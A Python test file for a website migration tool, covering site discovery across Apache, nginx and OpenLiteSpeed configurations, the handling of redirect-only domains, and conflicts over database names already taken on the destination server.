def test_the_sites_of_nginx_are_found_as_well(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    server = _server(_conf(tmp_path, shop, plain), **{"nginx": NGINX_T})
    found = migrate.sites(server)
    winkel = [site for site in found if site["name"] == "winkel.example.nl"][0]
    assert winkel["aliases"] == ["www.winkel.example.nl"]
    assert winkel["docroot"] == "/home/winkel/public_html"
    assert winkel["server"] == migrate.NGINX
    assert winkel["wordpress"] is False
    # A server block for whatever is asked for belongs to nobody, so it is no site.
    assert [site["name"] for site in found if site["docroot"] == "/var/www/html"] == []


def test_without_nginx_t_the_files_of_sites_enabled_are_read(tmp_path):
    _write(tmp_path / "nginx" / "winkel", NGINX_T)
    server = Server({"apache2ctl": migrate.CommandFailed("not installed", missing=True),
                     "information_schema": ""})
    notes = []
    found = migrate.sites(server, notes, sites_dir=str(tmp_path / "none"),
                          nginx_dir=str(tmp_path / "nginx"))
    assert [site["name"] for site in found] == ["winkel.example.nl"]
    assert any("nginx -T" in note for note in notes)


def test_the_sites_of_openlitespeed_are_found_with_the_names_its_listeners_map(tmp_path):
    server = Server({"apache2ctl": migrate.CommandFailed("not installed", missing=True),
                     "information_schema": ""})
    found = migrate.sites(server, sites_dir=str(tmp_path / "none"), lsws_root=_lsws(tmp_path))
    assert [(site["name"], site["aliases"]) for site in found] == [
        ("example.test", []), ("club.example.nl", ["www.club.example.nl"])]
    # Example's paths don't start at the root of the machine, so they start at OpenLiteSpeed's own directory.
    assert found[0]["docroot"] == str(tmp_path / "lsws" / "Example" / "html")
    assert found[1]["docroot"] == "/home/club/club.example.nl/html"
    assert found[1]["server"] == migrate.LITESPEED


def test_an_openlitespeed_site_with_a_docroot_of_its_own_keeps_it(tmp_path):
    server = Server({"apache2ctl": migrate.CommandFailed("not installed", missing=True),
                     "information_schema": ""})
    root = _lsws(tmp_path, vhconf="docRoot                 /var/www/club\n")
    found = migrate.sites(server, sites_dir=str(tmp_path / "none"), lsws_root=root)
    assert [site["docroot"] for site in found if site["name"] == "club.example.nl"] == ["/var/www/club"]


def test_a_name_two_web_servers_serve_is_one_site(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    nginx = NGINX_T.replace("winkel.example.nl www.winkel.example.nl", "plain.example.nl rooted.example.nl")
    server = _server(_conf(tmp_path, shop, plain), **{"nginx": nginx})
    found = migrate.sites(server)
    plain_sites = [site for site in found if site["name"] == "plain.example.nl"]
    assert len(plain_sites) == 1
    assert plain_sites[0]["docroot"] == str(plain)  # Apache's, which was found first
    assert plain_sites[0]["aliases"] == ["rooted.example.nl"]


# ---- Sites that are nothing but a redirect ----------------------------------

REDIRECT_VHOST = """<VirtualHost *:80>
    ServerName oud.example.nl
    ServerAlias www.oud.example.nl
    Redirect 301 / https://nieuw.example.nl/
</VirtualHost>
"""

REWRITE_VHOST = """<VirtualHost *:443>
    ServerName shop.example.nl
    DocumentRoot /var/www/shop
    RewriteEngine On
    RewriteCond %{HTTP_HOST} ^winkel\\.example\\.nl$ [NC]
    RewriteRule ^(.*)$ https://shop.example.nl/$1 [R=301,L]
    RedirectMatch 301 ^/oud/(.*)$ https://shop.example.nl/nieuw/$1
    RewriteRule ^intern/(.*)$ /binnen/$1 [L]
    ProxyPass /api http://127.0.0.1:8080/api
</VirtualHost>
"""


def _redirect_conf(tmp_path, text, name="redirect.conf"):
    _write(tmp_path / "sites-enabled" / name, text)
    server = Server({"apache2ctl": migrate.CommandFailed("no apache2ctl", missing=True),
                     "information_schema": ""})
    return migrate.sites(server, [], sites_dir=str(tmp_path / "sites-enabled"))


def test_a_domain_that_only_redirects_is_a_site_to_move_and_not_a_problem(tmp_path):
    """It has no files and no DocumentRoot, and neither is anything missing: the rules are the whole site."""
    found = _redirect_conf(tmp_path, REDIRECT_VHOST)

    assert [site["name"] for site in found] == ["oud.example.nl"]
    assert found[0]["problem"] is None and migrate.redirect_only(found[0])
    assert found[0]["redirect"]["to"] == "https://nieuw.example.nl/"
    assert found[0]["redirect"]["rules"] == ["Redirect 301 / https://nieuw.example.nl/"]


def test_the_rules_of_a_real_site_are_read_but_it_stays_a_wordpress_site(tmp_path):
    """A site with files keeps its own .htaccess when they are copied, so its rules are not moved twice."""
    _wp_config(tmp_path / "shop")
    _write(tmp_path / "sites-enabled" / "shop.conf",
           REWRITE_VHOST.replace("/var/www/shop", str(tmp_path / "shop")))
    server = Server({"apache2ctl": migrate.CommandFailed("none", missing=True),
                     "information_schema": "shopdb\t10\n"})

    found = migrate.sites(server, [], sites_dir=str(tmp_path / "sites-enabled"))

    assert found[0]["wordpress"] is True and not migrate.redirect_only(found[0])
    assert migrate.site_items(found, owner_of=lambda path: "shop")[0]["redirect"] is None


def test_what_a_redirect_does_besides_redirecting_is_named_and_not_guessed_at(tmp_path):
    found = _redirect_conf(tmp_path, REWRITE_VHOST)
    rules, by_hand = found[0]["redirect"]["rules"], found[0]["redirect"]["by_hand"]

    # The conditional one keeps its condition, and the rule about one path comes too.
    assert rules == ["RewriteCond %{HTTP_HOST} ^winkel\\.example\\.nl$ [NC]",
                     "RewriteRule ^(.*)$ https://shop.example.nl/$1 [R=301,L]",
                     "RedirectMatch 301 ^/oud/(.*)$ https://shop.example.nl/nieuw/$1"]
    # A rule with a condition in front of it says nothing about where the domain as a whole has gone.
    assert found[0]["redirect"]["to"] is None
    assert by_hand == [migrate.NOT_A_REDIRECT % ("RewriteRule", "^intern/(.*)$ /binnen/$1"),
                       migrate.PROXIES % ("ProxyPass", "/api http://127.0.0.1:8080/api")]


def test_an_nginx_redirect_is_written_as_the_apache_rules_a_htaccess_holds(tmp_path):
    text = """
    server {
        listen 80;
        server_name oud.example.nl www.oud.example.nl;
        return 301 https://nieuw.example.nl$request_uri;
    }
    server {
        server_name pad.example.nl;
        rewrite ^/oud/(.*)$ https://nieuw.example.nl/nieuw/$1 permanent;
        location /api { proxy_pass http://127.0.0.1:8080; }
    }
    """
    _write(tmp_path / "nginx" / "sites.conf", text)
    server = Server({"apache2ctl": migrate.CommandFailed("none", missing=True), "information_schema": ""})

    found = migrate.sites(server, [], sites_dir=str(tmp_path / "none"),
                          nginx_dir=str(tmp_path / "nginx"))

    whole = [site for site in found if site["name"] == "oud.example.nl"][0]
    assert whole["redirect"]["rules"] == ["RewriteRule ^(.*)$ https://nieuw.example.nl/$1 [R=301,L]"]
    assert whole["redirect"]["to"] == "https://nieuw.example.nl/$1"
    path = [site for site in found if site["name"] == "pad.example.nl"][0]
    assert path["redirect"]["rules"] == ["RewriteRule ^oud/(.*)$ https://nieuw.example.nl/nieuw/$1 [R=301,L]"]
    assert path["redirect"]["by_hand"] == [migrate.PROXIES % ("proxy_pass", "http://127.0.0.1:8080")]


def test_a_redirect_is_an_item_that_moves_with_no_files_and_no_database(tmp_path):
    found = _redirect_conf(tmp_path, REDIRECT_VHOST)

    item = migrate.site_items(found, owner_of=lambda path: None)[0]

    assert item["problem"] is None and item["database"] is None and item["wordpress"] is False
    assert item["redirect"]["rules"] == ["Redirect 301 / https://nieuw.example.nl/"]
    assert migrate.cost(item) == "a redirect, and no files"


SITE_WITH_A_RULE = """<VirtualHost *:80>
    ServerName renard.nl
    DocumentRoot {root}
    RedirectMatch 301 ^/oud/(.*)$ https://renard.nl/nieuw/$1
    RewriteRule ^shop/(.*)$ https://shop.renard.nl/$1 [R=301,L]
</VirtualHost>
"""


def test_a_site_with_files_and_a_rule_is_a_site_to_copy_and_not_a_redirect(tmp_path):
    """Rules on their own are no redirect. Taking a site that is not WordPress for one would move the rule and
    quietly leave the site itself behind, with the screen calling it done."""
    root = tmp_path / "renard"
    _write(root / "index.php", "<?php echo 1;")

    found = _redirect_conf(tmp_path, SITE_WITH_A_RULE.format(root=root))

    assert migrate.redirect_only(found[0]) is False
    # Its rules are in the web server's configuration, which nobody copies with the files.
    assert found[0]["redirect"]["by_hand"][0].startswith(
        "its redirect is in the web server's own configuration here")
    item = migrate.site_items(found, owner_of=lambda path: "renard")[0]
    assert item["redirect"] is None
    assert item["problem"] == migrate.NOT_WORDPRESS % str(root)
    assert "RedirectMatch" in item["leftover"] and "RewriteRule" in item["leftover"]


def test_a_web_root_with_nothing_in_it_is_still_only_a_redirect(tmp_path):
    """A name whose files are gone, or that never had any, is the ordinary parked domain."""
    root = tmp_path / "parked"
    _write(root / "index.html", "<html>moved</html>")

    found = _redirect_conf(tmp_path, SITE_WITH_A_RULE.format(root=root))

    assert migrate.redirect_only(found[0]) is True and found[0]["problem"] is None


def test_a_rule_that_catches_everything_makes_the_files_beside_it_beside_the_point(tmp_path):
    """The old files are still on disk, and not one request ever reaches them."""
    root = tmp_path / "oud"
    _write(root / "index.php", "<?php echo 1;")
    text = SITE_WITH_A_RULE.format(root=root).replace(
        "    RedirectMatch 301 ^/oud/(.*)$ https://renard.nl/nieuw/$1\n",
        "    Redirect 301 / https://renard.nl/\n")

    found = _redirect_conf(tmp_path, text)

    assert migrate.redirect_only(found[0]) is True
    assert found[0]["redirect"]["to"] == "https://renard.nl/"


def test_the_plain_http_to_https_redirect_is_not_a_redirect(tmp_path):
    """Every virtual host has it, it sends visitors to the name they asked for, and the new server's own
    template does it for every site there. Taking it for a redirect made every site look like one."""
    text = """<VirtualHost *:80>
    ServerName renard.nl
    DocumentRoot {root}
    RewriteEngine On
    RewriteCond %{{HTTPS}} off
    RewriteRule .* https://%{{HTTP_HOST}}%{{REQUEST_URI}} [L,R=301]
</VirtualHost>
""".format(root=tmp_path / "renard")
    _write(tmp_path / "renard" / "index.php", "<?php")

    found = _redirect_conf(tmp_path, text)

    assert found[0]["redirect"] is None and migrate.redirect_only(found[0]) is False


def test_an_nginx_host_that_only_sends_visitors_to_https_is_not_a_redirect_either(tmp_path):
    _write(tmp_path / "nginx" / "sites.conf", """
    server { server_name a.nl; return 301 https://$host$request_uri; }
    server { server_name b.nl; rewrite ^ https://$server_name$request_uri permanent; }
    """)
    server = Server({"apache2ctl": migrate.CommandFailed("none", missing=True), "information_schema": ""})

    found = migrate.sites(server, [], sites_dir=str(tmp_path / "none"), nginx_dir=str(tmp_path / "nginx"))

    assert [site["redirect"] for site in found] == [None, None]


# ---- A database name the new server already has ----------------------------

class Applies:
    """The new server, for which some database names are taken already."""

    def __init__(self, taken=("together",)):
        self.taken, self.sent = set(taken), []

    def ask(self, request, timeout=None):
        self.sent.append(dict(request))
        item = request["item"]
        database = item.get("new_database") or item.get("database")
        if database in self.taken and (request.get("answers") or {}).get("database") != "yes":
            free = next(name for name in ("%s_%d" % (database, n) for n in range(2, 9))
                        if name not in self.taken)
            return {"ok": False, "ask": {
                "about": "database",
                "question": "The database %s is already on this server. Going on empties it and puts the "
                            "site's data in its place. Go on? Or give the site a database of another name "
                            "here; %s is free." % (database, free)}}
        return {"ok": True, "docroot": "/home/together/public_html/www", "database": database, "steps": []}


SITE_ITEM = {"id": "site:together.nl", "kind": "site", "name": "together.nl", "user": "together",
             "database": "together"}


def _applied(server, answers):
    """The database question is the only one here, and these are the answers to it, in order."""
    return migrate._apply_with_questions(
        server, SITE_ITEM, ask=lambda text: "no", report=migrate.Report(),
        ask_name=lambda text: answers.pop(0))


def test_a_database_name_that_is_taken_can_be_answered_with_another_name():
    """Emptying the one that is there is one answer; the site having a database of its own is the other, and
    before this the only way to that was to stop and start again."""
    server = Applies()

    answer, left = _applied(server, ["together_2"])

    assert left is None and answer["ok"] is True
    # The dump goes into the name that was given, and the old server is told to use it.
    assert answer["database"] == "together_2"
    assert [request["item"].get("new_database") for request in server.sent] == [None, "together_2"]
    assert all(not (request.get("answers") or {}) for request in server.sent)


def test_a_name_the_new_server_also_has_is_asked_about_again():
    server = Applies(taken=("together", "together_2"))

    answer, left = _applied(server, ["together_2", "together_3"])

    assert left is None and answer["ok"] is True and answer["database"] == "together_3"
    assert [request["item"].get("new_database") for request in server.sent] == [None, "together_2", "together_3"]


def test_the_same_name_twice_stops_instead_of_asking_for_ever():
    server = Applies(taken=("together", "together_2"))

    answer, left = _applied(server, ["together_2", "together_2"])

    assert answer["ok"] is False and left is not None and left["about"] == "database"


def test_yes_still_empties_the_database_that_is_there():
    server = Applies()

    answer, left = _applied(server, ["yes"])

    assert left is None and answer["ok"] is True and answer["database"] == "together"
    assert server.sent[-1]["answers"] == {"database": "yes"}
